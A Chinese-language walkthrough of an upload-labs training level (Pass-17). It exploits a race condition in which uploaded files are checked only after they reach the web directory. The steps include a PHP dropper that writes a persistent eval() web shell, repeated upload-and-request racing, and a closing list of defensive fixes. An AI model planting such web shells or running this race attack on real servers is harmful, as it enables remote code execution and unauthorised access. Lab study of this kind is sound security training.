# Pass-17 条件竞争

## 一、关卡说明

服务端先 **移动文件到上传目录** ，之后再校验，校验失败则删除。利用校验和删除之间的时间窗口，抢占访问执行。

## 二、原理说明

```php
move_uploaded_file($tmp, $upload_file);   // 先移动
if (!check($upload_file)) {               // 后校验
    unlink($upload_file);                 // 不合格删除
    die('文件不合格');
}
```

问题：文件在校验期间 **真实存在于 Web 目录** ，可以被访问。如果在校验和删除之间的极短时间内访问到它，就能执行代码。

## 三、绕过步骤

 **这个思路是「持续上传 + 持续访问」的并发竞争** 

1. 准备 `shell.php`，内容为写马操作：

   ```php
   <?php
   fputs(fopen('shell.php','w'), '<?php @eval($_POST["cmd"]);?>');
   ?>
   ```

   这样即使原文件被删除，只要被访问过一次，就在同目录生成一个永久后门

2. 使用 Burp  **Intruder**  或  **Python 脚本** ， **无限次重复上传** 这个文件
3. 同时用浏览器/脚本 **无限次访问**  `upload/shell.php`
4. 只要有一次访问命中了「文件存在但还没被删除」的窗口，就会生成新的 `shell.php`
5. 停止攻击，访问 `upload/shell.php`，连接蚁剑

 **推荐工具** ：Python 用 `requests` + 多线程，或用 `race-the-web` 工具。

## 四、验证

攻击结束后访问 `upload/shell.php`，确认后门文件存在，蚁剑连接成功。

## 五、防御建议

1. 校验必须在移动文件 **之前** 完成
2. 上传文件和 Web 可访问目录分离
3. 上传目录禁止脚本执行
